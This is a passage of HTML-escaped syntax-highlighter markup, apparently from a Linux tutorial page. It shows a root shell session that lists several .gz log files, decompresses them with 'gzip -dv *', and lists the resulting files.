&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-24&quot;&gt;24&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-25&quot;&gt;25&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-26&quot;&gt;26&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-27&quot;&gt;27&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-28&quot;&gt;28&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-29&quot;&gt;29&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-30&quot;&gt;30&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-31&quot;&gt;31&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-32&quot;&gt;32&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-33&quot;&gt;33&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-34&quot;&gt;34&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-35&quot;&gt;35&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-36&quot;&gt;36&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-37&quot;&gt;37&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-38&quot;&gt;38&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-39&quot;&gt;39&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-40&quot;&gt;40&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-41&quot;&gt;41&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-42&quot;&gt;42&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-43&quot;&gt;43&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-44&quot;&gt;44&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-45&quot;&gt;45&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-46&quot;&gt;46&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-47&quot;&gt;47&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-48&quot;&gt;48&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-49&quot;&gt;49&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-50&quot;&gt;50&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-51&quot;&gt;51&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-52&quot;&gt;52&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b6a359730931-53&quot;&gt;53&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-1&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# ll&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-2&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-3&quot;&gt;总计 &lt;span class=&quot;crayon-cn&quot;&gt;28&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-4&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-5&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;1341&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;linklog&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-6&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-7&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1341&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2012&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-8&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-9&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;70&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-10&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-11&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2014&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-12&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-13&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2015&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-14&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-15&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2016&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-16&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-17&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2017&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-18&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-19&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# gzip -dv *&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-20&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-21&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;linklog&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;99.6&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;replaced&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;linklog&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-22&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-23&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;log2012&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;99.6&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;replaced&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2012&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-24&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-25&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;47.5&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;replaced&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-26&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-27&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;log2014&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;0.0&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;replaced&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2014&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-28&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-29&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;log2015&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;0.0&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;replaced&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2015&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-30&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-31&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;log2016&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;0.0&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;replaced&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2016&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-32&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-33&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;log2017&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;0.0&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;replaced&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2017&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-34&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-35&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# ll&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-36&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-37&quot;&gt;总计 &lt;span class=&quot;crayon-cn&quot;&gt;604&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-38&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-39&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;302108&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;linklog&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-40&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b6a359730931-41&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;302108&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2012&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
